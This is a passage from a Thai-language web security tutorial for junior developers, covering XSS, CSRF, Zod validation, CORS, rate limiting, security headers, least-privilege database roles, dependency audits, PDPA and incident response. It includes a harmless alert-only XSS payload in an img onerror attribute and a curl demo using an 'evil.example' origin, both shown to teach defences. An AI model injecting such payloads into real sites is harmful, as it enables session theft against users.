  // "ชื่อลูกค้า" ที่คนร้ายตั้งมา (ทดลองแบบไม่เป็นอันตราย แค่เด้ง alert)
  const name = '<img src=x onerror="alert(\'XSS ทำงาน!\')">';

  document.getElementById("a").innerHTML = name;     // ❌ browser ตีความเป็น HTML
  document.getElementById("b").textContent = name;   // ✅ แสดงเป็นข้อความตรงๆ
</script>
```
**ควรเห็น:** หน้าเด้งกล่องข้อความ **XSS ทำงาน!** (จากบรรทัด `innerHTML`) และอีกบรรทัดแสดงตัวอักษร `<img src=x onerror=...>` ตรงๆ เป็นข้อความธรรมดา (จากบรรทัด `textContent`) ถ้าคนร้ายเปลี่ยน `alert(...)` เป็นโค้ดส่ง cookie ออกไป นั่นคือการขโมยจริง

> 💡 `innerHTML` ไม่รัน `<script>` ที่แทรกเข้าไป แต่รันโค้ดผ่านแอตทริบิวต์อย่าง `onerror` ได้ จึงอันตรายเท่ากัน

**ป้องกัน**
1. ใช้ `textContent` (หรือ framework ที่ escape ให้เอง เช่น `{ชื่อ}` ใน React) อย่าใช้ `innerHTML`/`dangerouslySetInnerHTML` กับข้อมูลผู้ใช้
2. ถ้าต้องแสดง HTML จากผู้ใช้จริงๆ (เช่นบทความ) ผ่านไลบรารีทำความสะอาด (sanitize) ที่น่าเชื่อถือก่อนเสมอ
3. ถ้าต้อง render HTML เองฝั่ง server ให้ **escape** อักขระพิเศษ ตัวอย่างฟังก์ชันง่ายๆ
   ```ts
   const escapeHtml = (s: string) =>
     s.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;")
      .replaceAll('"', "&quot;").replaceAll("'", "&#39;");
   console.log(escapeHtml(`<img src=x onerror="steal()">`));
   ```
   **ควรเห็น:** `&lt;img src=x onerror=&quot;steal()&quot;&gt;` ซึ่ง browser แสดงเป็นตัวอักษร ไม่รัน
4. cookie เซสชันตั้ง `HttpOnly` (ขโมยยากขึ้น แม้โดน XSS)
5. ชั้นเสริม: header `Content-Security-Policy` สั่ง browser จำกัดว่าสคริปต์โหลดจากไหนได้ (ดูหัวข้อ security headers)

### 🎭 CSRF (Cross-Site Request Forgery)

**เรื่องคือ:** เรา login ธนาคารค้างไว้ในแท็บหนึ่ง (browser มี cookie เซสชันแล้ว) แล้วเผลอเปิดเว็บร้ายอีกแท็บ เว็บร้ายซ่อนฟอร์มที่ส่ง `POST` ไปที่ `bank.example/transfer` browser **แนบ cookie ของธนาคารไปให้เอง** ธนาคารเห็น cookie ถูกต้องก็เข้าใจว่าเราสั่งโอนเงินเอง

![เว็บร้ายหลอกให้ browser ที่ login ค้างไว้ ส่งคำสั่งไปธนาคารพร้อม cookie พร้อมวิธีกัน SameSite CSRF token และตรวจ Origin](/img/10-csrf-flow.svg)
*คนร้ายไม่ต้องรู้ cookie ของเรา แค่ให้ browser เราเป็นคนส่งแทน*

**ป้องกัน (ใช้ร่วมกันได้)**
1. **`SameSite=Lax` (หรือ `Strict`)** บน cookie: browser จะไม่แนบ cookie เมื่อ request มาจากเว็บอื่น (นี่คือด่านแรกที่ง่ายที่สุด และ browser รุ่นใหม่ส่วนใหญ่ถือ Lax เป็นค่าเริ่มต้น แต่ควรตั้งให้ชัดเจนเสมอ)
2. **CSRF token:** ฟอร์มจริงของเรามีรหัสลับสุ่มแนบมาด้วย server ตรวจว่ารหัสตรง เว็บร้ายไม่รู้รหัสจึงปลอมไม่ได้
3. **ตรวจ header `Origin`** ว่า request มาจากโดเมนเราจริงหรือไม่
4. **ห้ามใช้ `GET` ทำสิ่งที่เปลี่ยนข้อมูล** (ลบ โอน แก้) ให้ใช้ `POST`/`PUT`/`DELETE` (บทที่ 5)
5. ถ้า API ส่ง token ใน header เอง (`Authorization: Bearer ...`) แทน cookie browser จะไม่แนบให้เองจึงเสี่ยง CSRF น้อยกว่ามาก (แต่ต้องดูแลเรื่อง XSS ที่อาจขโมย token แทน)

> 🧪 **ลองดูเอง:** ตั้ง cookie ในเซิร์ฟเวอร์ทดลองด้วย `SameSite=Strict` กับ `SameSite=None` แล้วดูใน DevTools > Application > Cookies ว่าคอลัมน์ SameSite เปลี่ยนตาม (ต้องเข้าใจก่อนว่า `SameSite=None` ต้องคู่กับ `Secure` จึงจะถูก browser ยอมรับ)

### 🚪 ไม่ตรวจข้อมูลจากผู้ใช้
ข้อมูลจาก request **เชื่อไม่ได้ 100%** แม้จะมาจากแอปของเราเอง (ใครก็ส่ง request ตรงได้ด้วย curl)
- ตรวจด้วย **Zod** ทุก endpoint
- ราคา/ส่วนลด **คำนวณที่ server** ห้ามรับราคาที่ client ส่งมาเชื่อเลย 💸

**ตรวจ 4 อย่าง:** ชนิด (เป็น string ไหม), รูปแบบ (เป็นอีเมลไหม), ช่วง/ความยาว (≥ 8 ตัว, ราคา ≥ 0) และ **ฟิลด์ที่อนุญาต** (ไม่รับฟิลด์แปลกปลอมอย่าง `isAdmin`)

#### 💥 ลองพังมันดู: Zod ช่วยกรองอะไรให้บ้าง

```ts
import { z } from "zod";
const Register = z.object({ email: z.email(), password: z.string().min(8) });

const r = Register.safeParse({ email: "abc", password: "123" });
console.log(r.success);
if (!r.success) console.log(r.error.issues.map((i) => `${i.path.join(".")}: ${i.message}`));

// ส่งฟิลด์เกินมา (หวังจะตั้งตัวเองเป็นแอดมิน)
console.log(Register.safeParse({ email: "a@b.co", password: "12345678", isAdmin: true }));
```
**ควรเห็น** (ข้อความ error อาจต่างตามเวอร์ชัน Zod)
```
false
[ "email: Invalid email address", "password: Too small: expected string to have >=8 characters" ]
{
  success: true,
  data: {
    email: "a@b.co",
    password: "12345678",
  },
}
```
สังเกตข้อสุดท้าย: `isAdmin: true` **ถูกทิ้ง** ไม่ปรากฏใน `data` เพราะ schema ไม่ได้ประกาศ Zod จึงตัดทิ้งให้ (ปกติ) ถ้าเราเอา `data` ไปบันทึกลง DB เท่ากับไม่มีใครตั้งตัวเองเป็นแอดมินได้ แต่ถ้าเราเอา `req.body` ดิบๆ ไปบันทึกตรงๆ จะโดน (ช่องโหว่แบบนี้เรียก mass assignment) **ใช้ข้อมูลที่ผ่านการ parse แล้วเท่านั้น**

> 💡 การตรวจฝั่ง client (ฟอร์มหน้าเว็บ) ใช้เพื่อ UX เท่านั้น **การตรวจที่ server คือของจริง**

### 🌐 CORS
browser กันไม่ให้เว็บโดเมนหนึ่งเรียก API อีกโดเมนโดยไม่ได้รับอนุญาต
- ⚠️ อย่าแก้ปัญหา CORS ด้วยการเปิด `*` ให้ทุกโดเมน ใน API ที่ใช้ cookie/login ให้ระบุโดเมนที่อนุญาตชัดเจน

**CORS ไม่ใช่ระบบ login และไม่ใช่ firewall** มันเป็นกฎของ **browser** ที่ปกป้องผู้ใช้ (ไม่ให้เว็บร้ายอ่านคำตอบของ API ที่ผู้ใช้ login ค้างไว้) ไม่ได้ปกป้อง server จากคนที่ยิง request ตรง

#### 💥 ลองพังมันดู: curl ไม่สนใจ CORS

server ที่ตอบ `Access-Control-Allow-Origin` เฉพาะ `http://localhost:5173` บันทึกเป็น `cors-demo.ts` แล้วสั่ง `bun cors-demo.ts` **เปิดค้างไว้** (server จะไม่พิมพ์อะไรและไม่คืน prompt นั่นคือมันกำลังรอรับ request) จากนั้น **เปิด Terminal หน้าต่างใหม่** เพื่อสั่ง `curl` เสร็จแล้วกลับไปกด Ctrl+C ที่หน้าต่างแรกเพื่อปิด
```ts
const ALLOWED = "http://localhost:5173";
Bun.serve({ port: 3997, fetch(req) {
  const origin = req.headers.get("origin");
  const h: Record<string, string> = { "Content-Type": "application/json" };
  if (origin === ALLOWED) { h["Access-Control-Allow-Origin"] = ALLOWED; h["Vary"] = "Origin"; }
  return new Response(JSON.stringify({ secret: "data" }), { headers: h });
}});
```
```bash
curl -si -H "Origin: http://localhost:5173" localhost:3997
curl -si -H "Origin: https://evil.example"  localhost:3997
```
**ควรเห็น** (บรรทัด `Date` เป็นเวลาตอนที่เรารัน)
```
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: http://localhost:5173
Vary: Origin
Date: Thu, 22 Oct 2026 18:44:30 GMT
Content-Length: 17

{"secret":"data"}

HTTP/1.1 200 OK
Content-Type: application/json
Date: Thu, 22 Oct 2026 18:44:30 GMT
Content-Length: 17

{"secret":"data"}
```
สังเกต: ทั้งสองครั้ง server **ตอบ 200 และส่งข้อมูลกลับ** ต่างกันแค่คำตอบแรกมี header `Access-Control-Allow-Origin` (และ `Vary`) เฉพาะโดเมนที่อนุญาต คนที่ใช้ curl เห็นข้อมูลได้เสมอ ส่วนใน browser โค้ดจากเว็บ evil.example จะถูกกันไม่ให้ **อ่านผลลัพธ์** เพราะไม่มี header นี้ บทเรียน: **ข้อมูลที่ต้องปิดบัง ต้องปกป้องด้วย login + สิทธิ์ ไม่ใช่ CORS**

**ข้อควรระวัง**
- เปิด `*` กับ API สาธารณะที่ไม่ใช้ cookie ได้ (เช่นข้อมูลเปิดทั่วไป) แต่ API ที่ใช้ cookie/login ต้องระบุโดเมนชัด
- อย่า "สะท้อน" ค่า Origin ที่ได้รับกลับไปทุกอย่างโดยไม่เช็ครายการที่อนุญาต (เท่ากับเปิดให้ทุกโดเมน)
- ถ้าใช้ `credentials` (ส่ง cookie ข้ามโดเมน) browser ไม่ยอมรับ `*` ต้องระบุโดเมน

### 📣 Error ที่บอกมากเกินไป
- ❌ ตอบ client ว่า `error: password authentication failed for user "admin" at 10.0.0.5:5432`
- ✅ ตอบ `{ "error": "เกิดข้อผิดพลาด กรุณาลองใหม่" }` แล้วเก็บรายละเอียดไว้ใน log ฝั่ง server

stack trace, ชื่อตาราง, path ไฟล์, เวอร์ชันซอฟต์แวร์ ล้วนเป็นข้อมูลให้คนร้ายใช้วางแผน ตอบแค่ข้อความทั่วไป (พร้อมรหัสอ้างอิง เช่น `requestId`) แล้วให้เราไปค้นใน log เองได้ (บทที่ 9 ข้อ 3 และ 11)

### 🔁 ลองรหัสผ่านรัวๆ (Brute force)
จำกัดจำนวนครั้ง (rate limit) เช่น login ผิดได้ 5 ครั้งต่อ 15 นาที

**ทำไมต้องมี:** รหัสผ่านที่ hash ไว้อย่างดีก็ยังโดน "ลองเดาผ่านหน้า login" ได้ ถ้าไม่จำกัดจำนวนครั้ง บอทจะลองรหัสยอดนิยมนับล้านชุดกับทุกอีเมล

#### 🔧 ลองเขียน rate limiter ง่ายๆ (เก็บในหน่วยความจำ)

```ts
const hits = new Map<string, { count: number; resetAt: number }>();

function allow(key: string, max = 5, windowMs = 15 * 60_000): boolean {
  const now = Date.now();
  const h = hits.get(key);
  if (!h || now > h.resetAt) {                       // หน้าต่างเวลาใหม่
    hits.set(key, { count: 1, resetAt: now + windowMs });
    return true;
  }
  h.count++;
  return h.count <= max;
}

for (let i = 1; i <= 7; i++) {
  console.log(`ครั้งที่ ${i}:`, allow("1.2.3.4") ? "ผ่าน" : "429 ช้าก่อน");
}
```
**ควรเห็น**
```
ครั้งที่ 1: ผ่าน
ครั้งที่ 2: ผ่าน
ครั้งที่ 3: ผ่าน
ครั้งที่ 4: ผ่าน
ครั้งที่ 5: ผ่าน
ครั้งที่ 6: 429 ช้าก่อน
ครั้งที่ 7: 429 ช้าก่อน
```
ใน endpoint จริง เมื่อ `allow(...)` เป็น `false` ให้ตอบสถานะ **`429 Too Many Requests`** (และจะแนบ header `Retry-After` บอกให้รอกี่วินาทีก็ได้)

**ข้อควรรู้**
- นับตาม **IP** และตาม **บัญชี (อีเมล)** ทั้งคู่ (นับแค่ IP แล้วคนร้ายเปลี่ยน IP ได้ นับแค่อีเมลแล้วคนร้ายล็อกบัญชีเหยื่อได้)
- ตัวอย่างนี้เก็บในหน่วยความจำของ process เดียว ถ้ารันหลาย instance หรือรีสตาร์ท ตัวนับจะหาย ระบบจริงเก็บใน Redis หรือใช้ middleware สำเร็จรูป (เช่น `express-rate-limit`)
- endpoint ที่ควรจำกัด: login, สมัครสมาชิก, ลืมรหัสผ่าน, ส่งฟอร์มติดต่อ, ส่ง SMS/อีเมล (เพราะเสียเงิน)
- เสริมได้: หน่วงเวลาเพิ่มเมื่อผิดซ้ำ, แจ้งเตือนผู้ใช้เมื่อมี login ผิดผิดปกติ, เปิด 2FA

### 🔒 HTTPS
ระบบจริงต้องเป็น `https://` เสมอ ไม่งั้นรหัสผ่านวิ่งผ่านเน็ตแบบข้อความเปล่าให้คนดักอ่านได้

**HTTPS คืออะไร (ภาษาคน):** คือ HTTP ที่ห่อด้วยชั้นเข้ารหัสชื่อ **TLS** ทำสามอย่างพร้อมกัน
1. **เข้ารหัส** ข้อมูลระหว่าง browser กับ server คนกลาง (เช่นคนในไวไฟร้านกาแฟ) เห็นแต่ข้อมูลสับสน
2. **ยืนยันตัวตน server:** ใบรับรอง (certificate) ที่ออกโดยองค์กรที่ browser เชื่อถือ (CA) พิสูจน์ว่า "นี่คือเว็บนี้จริง ไม่ใช่ตัวปลอม"
3. **กันการแก้ไข** ข้อมูลระหว่างทาง

![ลำดับการจับมือของ HTTPS แบบย่อ: ทักทาย รับใบรับรอง ตรวจใบรับรอง ตกลงกุญแจลับ แล้วเข้ารหัสทุกอย่าง](/img/10-https-handshake.svg)
*ย่อมาก แต่จับหลักได้: ตกลงกุญแจลับร่วมกัน โดยไม่ต้องส่งกุญแจจริงผ่านเน็ต แล้วเข้ารหัสทุกอย่างด้วยกุญแจนั้น*

**ที่ต้องรู้ในงานจริง**
- ใบรับรองฟรีจาก **Let's Encrypt** ใช้ได้ และเครื่องมืออย่าง reverse proxy (เช่น Caddy, Nginx) หรือบริการ deploy ต่างๆ ตั้งค่า/ต่ออายุให้ (บทที่ 20 และ 22)
- ส่ง **redirect จาก `http://` ไป `https://`** ทั้งหมด และเปิด header **HSTS** (บอก browser ให้ใช้ HTTPS เสมอ)
- ห้ามมี **mixed content** (หน้า https ที่โหลดรูป/สคริปต์จาก `http://`) browser จะบล็อกหรือเตือน
- ตอน dev บน `http://localhost` ไม่เป็นไร เพราะข้อมูลไม่ออกจากเครื่อง
- cookie ที่ตั้ง `Secure` จะถูกส่งบน HTTPS เท่านั้น (ข้อ 3.3)
- ถ้า browser เตือนว่า "ใบรับรองไม่ถูกต้อง" **อย่ากด "ดำเนินการต่อ" เฉยๆ** แจ้งผู้ดูแลระบบ

### 🛡️ Security headers
เป็นชุด header ที่ server ส่งไปบอก browser ให้เปิดระบบป้องกันเพิ่ม ใส่ครั้งเดียวได้ผลทั้งเว็บ

| header | หน้าที่ |
|---|---|
| `Strict-Transport-Security` (HSTS) | ให้ browser ใช้ HTTPS เท่านั้นกับโดเมนนี้ |
| `Content-Security-Policy` (CSP) | จำกัดแหล่งที่สคริปต์/รูป/สไตล์โหลดได้ ลดความเสียหายจาก XSS |
| `X-Content-Type-Options: nosniff` | ไม่ให้ browser เดาชนิดไฟล์เอง |
| `X-Frame-Options: DENY` (หรือ CSP `frame-ancestors`) | ไม่ให้เว็บอื่นเอาหน้าเราไปใส่ใน iframe หลอกให้กด (clickjacking) |
| `Referrer-Policy` | คุมว่า URL ของเราถูกบอกเว็บอื่นแค่ไหนตอนคลิกลิงก์ออกไป |

ตัวอย่างและการตรวจ: บันทึกเป็น `headers-demo.ts` สั่ง `bun headers-demo.ts` เปิดค้างไว้ แล้วสั่ง `curl` จาก Terminal หน้าต่างใหม่ (ถ้าเจอ `Failed to start server. Is port 3998 in use?` แปลว่ายังเปิดตัวเก่าค้างไว้ที่อื่น ปิดด้วย Ctrl+C ก่อน)
```ts
Bun.serve({ port: 3998, fetch: () => new Response("hi", { headers: {
  "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
  "X-Content-Type-Options": "nosniff",
  "Content-Security-Policy": "default-src 'self'",
  "X-Frame-Options": "DENY",
  "Referrer-Policy": "strict-origin-when-cross-origin",
}})});
```
```bash
curl -sI http://localhost:3998/
```
**ควรเห็น**
```
HTTP/1.1 200 OK
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
...
```
> 💡 ไม่ต้องเขียนเอง: ใน Express ใช้แพ็กเกจ `helmet` ส่วน Hono มี middleware `secureHeaders` ในตัว เปิดแล้วค่อยปรับ
> ⚠️ CSP เข้มมากอาจทำให้หน้าเว็บของเราเองพังได้ (เช่น บล็อกสคริปต์ที่ฝังในหน้า) ลองเปิดใน DevTools > Console ดูข้อความที่โดนบล็อกก่อน (บทที่ 9 ข้อ 8)
> ⚠️ ที่ตั้ง `default-src 'self'` ข้างบนเป็นตัวอย่างที่เข้มมาก ใช้กับเว็บจริงต้องเพิ่มแหล่งที่อนุญาตตามที่เว็บใช้

### 🧱 Least privilege: ให้สิทธิ์น้อยที่สุดเท่าที่ทำงานได้
หลักคือ **ทุกคน ทุกโปรแกรม ทุก key ได้สิทธิ์เท่าที่จำเป็นเท่านั้น** ถ้ามีอะไรหลุดหรือพัง ความเสียหายจะจำกัดวง

| ตรงไหน | ❌ ทำแบบเสี่ยง | ✅ ทำแบบ least privilege |
|---|---|---|
| ผู้ใช้ DB ของแอป | ใช้ `postgres` / `root` (superuser) | สร้าง user เฉพาะแอป ให้เท่าที่ใช้ |
| API key ของบริการภายนอก | key ที่ทำได้ทุกอย่าง | key ที่จำกัดสิทธิ์ (อ่านอย่างเดียว ฯลฯ) |
| ผู้ใช้ในระบบ | ทุกคนเป็นแอดมิน | role แยก: staff / manager / admin |
| Container | รันเป็น root | รันด้วย user ธรรมดา |
| คนในทีม | ให้สิทธิ์ production ทุกคน | ให้เฉพาะคนที่ต้องใช้ ถอดเมื่อไม่ต้องใช้แล้ว |

ตัวอย่างใน PostgreSQL (สร้าง user ที่อ่านและเพิ่มข้อมูลได้ แต่ลบตารางไม่ได้) ใช้ชื่อ `app_rw` เพราะ `app_user` ในบทที่ 7 สร้างไว้แล้วและได้สิทธิ์ทั้งหมด (ถ้าสั่ง `CREATE ROLE app_user` ซ้ำจะเจอ `role "app_user" already exists`)

**รันที่ไหน:** ตาราง `rentals`, `laptops`, `customers` อยู่ในกล่อง `laptop-db` ของ [บทที่ 8b](/08b-db-to-backend) (database ชื่อ `postgres`) ไม่ใช่ database `bitcafe` ของบทที่ 7 (ถ้ารันผิดที่จะได้ `ERROR:  relation "rentals" does not exist`) เปิด psql ด้วย user `postgres` ก่อน
```bash
docker exec -it laptop-db psql -U postgres
```
```sql
CREATE ROLE app_rw LOGIN PASSWORD 'rw_demo_pw';   -- งานจริงใช้รหัสสุ่มยาวๆ เก็บใน .env
GRANT SELECT, INSERT, UPDATE ON rentals, laptops, customers TO app_rw;
GRANT USAGE ON ALL SEQUENCES IN SCHEMA public TO app_rw;
-- ไม่ให้ DELETE / DROP / สิทธิ์สร้างตาราง ตัว migration ใช้ user อีกตัวที่มีสิทธิ์มากกว่า
```
**ควรเห็น**
```
CREATE ROLE
GRANT
GRANT
```
พิมพ์ `\q` ออก แล้ว **พิสูจน์ด้วยตาตัวเอง** ว่าสิทธิ์ถูกจำกัดจริง โดยต่อเข้าไปในฐานะ `app_rw` แล้วลองทั้งสิ่งที่ควรทำได้และทำไม่ได้
```bash
docker exec -it laptop-db psql "postgres://app_rw:rw_demo_pw@localhost:5432/postgres" -c "SELECT count(*) FROM laptops;" -c "DELETE FROM rentals;" -c "DROP TABLE rentals;"
```
**ควรเห็น**
```
 count
-------
     3
(1 row)

ERROR:  permission denied for table rentals
ERROR:  must be owner of table rentals
```
อ่านได้ตามปกติ แต่ลบข้อมูลและลบตารางไม่ได้ ข้อมูลในตาราง `rentals` ยังอยู่ครบ นี่คือสิ่งที่ least privilege ซื้อให้เรา: ต่อให้โค้ดของแอปมีบั๊กหรือโดน SQL injection คำสั่งที่ทำลายข้อมูลก็ถูกฐานข้อมูลปฏิเสธเอง (จำนวนแถวใน `count` ขึ้นกับข้อมูลของเรา จาก seed บทที่ 8b จะได้ 3)
> 💡 ทำไมต้องมีบรรทัด `SEQUENCES`: คอลัมน์ `id SERIAL` ไม่ได้นับเลขเอง แต่ไปขอเลขถัดไปจาก **sequence** ซึ่งเป็นอีกวัตถุหนึ่งใน database ถ้าให้สิทธิ์แค่ตาราง INSERT จะพังด้วย `permission denied for sequence rentals_id_seq` นี่คือตัวอย่างว่า least privilege ต้องรู้ว่าระบบทำงานข้างในอย่างไร ไม่ใช่แค่ไล่ตัดสิทธิ์
> 💡 ประโยชน์ตรงๆ: ถ้า SQL injection หลุดมาสักจุด คนร้ายก็ลบตารางหรืออ่านตาราง `users` ไม่ได้ (ถ้าไม่ได้ให้สิทธิ์)

### 📦 Dependency security: library ที่เราใช้ก็มีรูได้
โปรเจกต์ใช้ library หลายร้อยตัว (รวมที่ติดมาโดยอ้อม) ถ้ามีตัวไหนเจอช่องโหว่ เราต้องอัปเดต

#### 🔧 ตรวจด้วย `npm audit`

```bash
npm audit
```
ตัวอย่างผลตรวจกับโปรเจกต์ทดลองที่จงใจติดตั้ง `lodash@4.17.15` (เวอร์ชันเก่า)
```
# npm audit report

lodash  <=4.17.23
Severity: high
Command Injection in lodash - https://github.com/advisories/GHSA-35jh-r3h4-6jhm
Prototype Pollution in lodash - https://github.com/advisories/GHSA-p6mc-m468-83gw
...
fix available via `npm audit fix`
node_modules/lodash

1 high severity vulnerability

To address all issues, run:
  npm audit fix
```
(รายละเอียดจะต่างกันตามเวลาที่คุณรัน เพราะมีการค้นพบช่องโหว่ใหม่ตลอด) อ่านผลยังไง
1. **Severity** (low/moderate/high/critical) จัดการ high/critical ก่อน
2. บรรทัด `fix available` แปลว่าอัปเดตแล้วหาย
3. รัน `npm audit fix` เพื่อให้มันอัปเดตแบบไม่เปลี่ยนเวอร์ชันหลัก (ปลอดภัยกว่า) **แล้วรัน test/เปิดแอปเช็คว่ายังทำงาน** ก่อน commit ห้ามใช้ `--force` ถ้ายังไม่เข้าใจ เพราะอาจเปลี่ยนเวอร์ชันหลักแล้วโค้ดพัง
4. ถ้าไม่มีทางแก้ ให้แจ้งพี่ ประเมินว่าช่องโหว่นั้นกระทบเรากับการใช้งานจริงไหม

ถ้าใช้ Bun หรือ Yarn ก็มีคำสั่งคล้ายกัน (เช่น `bun audit`, `yarn npm audit` ตามเวอร์ชันที่ใช้) หรือเปิด **Dependabot** บน GitHub ให้ส่งคำขออัปเดตมาให้เองอัตโนมัติ

**นิสัยที่ดี**
- ใช้ `package-lock.json` / `bun.lock` ที่ commit แล้ว เพื่อให้ทุกเครื่องได้เวอร์ชันเดียวกัน
- ก่อนติดตั้ง library ใหม่ เช็คว่าคนใช้เยอะ ยังมีคนดูแล ชื่อสะกดถูก (มีคนปล่อยแพ็กเกจปลอมชื่อเลียนแบบเพื่อดักคนพิมพ์ผิด)
- ติดตั้งเท่าที่จำเป็น ของที่ไม่ได้ใช้ให้ถอดออก

## 5. ข้อมูลลูกค้าและ PDPA 🇹🇭

**PDPA (พ.ร.บ.คุ้มครองข้อมูลส่วนบุคคล)** คุ้มครองข้อมูลที่ระบุตัวคนได้ เช่น ชื่อ เบอร์โทร เลขบัตรประชาชน ที่อยู่ รูปถ่าย

สิ่งที่น้องต้องทำในงานประจำวัน:
- ❌ ไม่ export ข้อมูลลูกค้าจริงมาเล่นในเครื่องตัวเอง ใช้ **ข้อมูลปลอม (seed data)** ตอน dev
- ❌ ไม่ log เลขบัตรประชาชน รหัสผ่าน token
- ❌ ไม่วางข้อมูลลูกค้าจริงลงใน AI, แชท, หรือ screenshot ส่งกลุ่ม
- ✅ เก็บเท่าที่จำเป็น และให้สิทธิ์เข้าถึงเท่าที่จำเป็น
- ✅ สงสัยว่าข้อมูลรั่ว **แจ้งพี่ทันที** ไม่ต้องกลัวโดนดุ การปิดเงียบคือสิ่งที่แย่ที่สุด

## 6. ✅ Security Checklist ก่อนเปิด MR

- [ ] ไม่มีความลับใน code / commit (`.env` อยู่ใน `.gitignore`)
- [ ] มี `.env.example` และตรวจ env ด้วย Zod
- [ ] รหัสผ่านผู้ใช้ hash ด้วย bcrypt/argon2
- [ ] ทุก endpoint ตรวจ input ด้วย Zod
- [ ] ไม่มี SQL ที่ต่อข้อความจากผู้ใช้
- [ ] endpoint ที่ต้อง login เช็คทั้ง "เป็นใคร" และ "มีสิทธิ์ไหม"
- [ ] error ที่ตอบ client ไม่เปิดเผยรายละเอียดภายใน
- [ ] ไม่ log ข้อมูลลับหรือข้อมูลส่วนตัว

### ก่อนขึ้นระบบจริง (Pre-launch checklist)

ก่อนเปิดให้คนจริงใช้ ไล่ตรวจเพิ่มอีกรอบ ใช้ตรวจร่วมกับเช็คลิสต์ก่อนขึ้นระบบจริงในบทที่ 23

**ความลับและการตั้งค่า**
- [ ] ความลับของ production แยกจาก dev และไม่เคยอยู่ใน Git (ตรวจประวัติ `git log -S"คำที่เป็นความลับ" --all`)
- [ ] `JWT_SECRET` ยาวและสุ่ม ไม่ใช่ `change-me`
- [ ] ปิดโหมด debug / ไม่เปิด stack trace ให้ผู้ใช้เห็น
- [ ] ปิดหน้า admin/ฐานข้อมูลที่ไม่จำเป็นไม่ให้เข้าจากอินเทอร์เน็ต (DB ไม่เปิด port สาธารณะ)

**การยืนยันตัวตนและสิทธิ์**
- [ ] cookie เซสชันตั้ง `HttpOnly` + `Secure` + `SameSite` และมีอายุ
- [ ] ทุก endpoint ที่เป็นข้อมูลส่วนตัวเช็คว่า "เป็นของคนที่ขอ" (ลองเปลี่ยน id ในตัวเองดู)
- [ ] login มี rate limit และข้อความ error เป็นกลาง
- [ ] user ของ DB สิทธิ์น้อยกว่า superuser

**ข้อมูลและการสื่อสาร**
- [ ] เป็น HTTPS ทั้งเว็บ และ `http://` redirect ไป `https://`
- [ ] ตั้ง security headers (อย่างน้อย HSTS, `nosniff`, CSP/frame protection)
- [ ] CORS ระบุโดเมนชัด ไม่เปิด `*` สำหรับ API ที่ใช้ login
- [ ] ข้อมูลทุกจุดที่รับจากผู้ใช้ตรวจด้วย Zod และแสดงผลด้วยการ escape

**การดูแลต่อเนื่อง**
- [ ] รัน `npm audit` แล้วไม่มี high/critical ที่แก้ได้ค้างอยู่
- [ ] มี backup ของฐานข้อมูล และลองกู้คืนได้จริงอย่างน้อยหนึ่งครั้ง
- [ ] มี log ที่ใช้สืบได้ (แต่ไม่มีข้อมูลลับ) และรู้ว่าจะแจ้งใครถ้าเกิดเหตุ (ข้อ 7)

## 7. 🚨 เกิดเหตุแล้วทำยังไง: Incident basics

สักวันอาจเจอเหตุจริง: key หลุด, มีคนเข้าระบบโดยไม่ได้รับอนุญาต, เว็บโดนแก้หน้า, ข้อมูลลูกค้าอาจรั่ว สิ่งสำคัญคือ **ตั้งสติ ทำตามลำดับ และแจ้งเร็ว** เหตุที่แจ้งเร็วมักเล็กกว่าเหตุที่ปิดเงียบ

1. **หยุดเลือดก่อน (contain):** ทำให้ความเสียหายไม่ลามต่อ เช่น เปลี่ยน key/รหัสผ่านที่หลุด (rotate), ระงับบัญชีที่ถูกใช้ผิดปกติ, ถ้าจำเป็นต้องปิดระบบชั่วคราว (ให้ผู้ใหญ่ตัดสินใจ)
2. **แจ้งพี่/ทีมทันที:** บอกสั้นๆ ว่า เกิดอะไร เมื่อไหร่ รู้ได้ยังไง (ใช้โครงเดียวกับเทมเพลตในบทที่ 9 ข้อ 6)
3. **เก็บหลักฐาน อย่าลบ:** เก็บ log, เวลา, ข้อความ error ไว้ ห้ามรีบลบหรือแก้ log เพราะจะเสียร่องรอยที่ใช้สืบ
4. **ประเมินขอบเขต:** อะไรหลุด? ข้อมูลของใคร? หลุดตั้งแต่เมื่อไหร่ถึงเมื่อไหร่?
5. **แก้ต้นเหตุ:** ปิดช่องที่ถูกใช้ แล้วทดสอบว่าปิดจริง
6. **แจ้งผู้ที่เกี่ยวข้อง:** ถ้าเป็นข้อมูลส่วนบุคคลของลูกค้า กฎหมาย PDPA มีเงื่อนไขการแจ้งผู้เกี่ยวข้องและหน่วยงานกำกับภายในกรอบเวลาสั้น (โดยทั่วไปไม่เกิน 72 ชั่วโมงนับจากทราบเหตุ ตามเงื่อนไขของกฎหมาย) เรื่องนี้ให้ผู้ใหญ่/ฝ่ายกฎหมายเป็นผู้ตัดสินใจ หน้าที่ของเราคือ **แจ้งให้เร็วที่สุด** เพื่อให้ทันกรอบเวลา
7. **ทบทวนแบบไม่โทษใคร (blameless review):** หลังเรื่องสงบ นั่งดูว่า "ระบบ" เปิดช่องให้พลาดได้ตรงไหน แล้วเติมด่านป้องกัน ไม่ใช่หาคนผิด

> 🧯 **เปรียบเทียบ:** เหมือนไฟไหม้เล็กๆ ในครัว ถ้ารีบปิดแก๊สและตะโกนเรียกคน ก็ดับได้ ถ้าเงียบแล้วหวังว่ามันจะดับเอง อาจไหม้ทั้งบ้าน
> 🤝 สงสัยว่าพลาดอะไรไปก็แจ้ง **ไม่มีใครโดนดุที่แจ้งเร็ว** แต่ทุกคนเดือดร้อนเมื่อมีคนปิดเงียบ

| `Failed to start server. Is port 3997 in use?` / `EADDRINUSE` | เปิด server ตัวอย่างค้างไว้อีกหน้าต่าง | กลับไปหน้าต่างเดิมกด Ctrl+C หรือหาตัวที่จับ port ด้วย `lsof -i :3997` (Mac/Linux) / `netstat -ano \| findstr :3997` (Windows) |
| `curl: (7) Failed to connect ... Couldn't connect to server` | ปิด server ไปแล้ว หรือยังไม่ได้เปิด | เปิด server ไว้ในหน้าต่างหนึ่ง แล้ว curl จากอีกหน้าต่าง |
| `ERROR: relation "rentals" does not exist` ตอน `GRANT` | ต่อผิด database (เช่น `bitcafe` ของบทที่ 7) | ต่อกล่อง `laptop-db` ของบทที่ 8b (ข้อ 4 Least privilege) |

## 🧠 เช็คความเข้าใจ

<details>
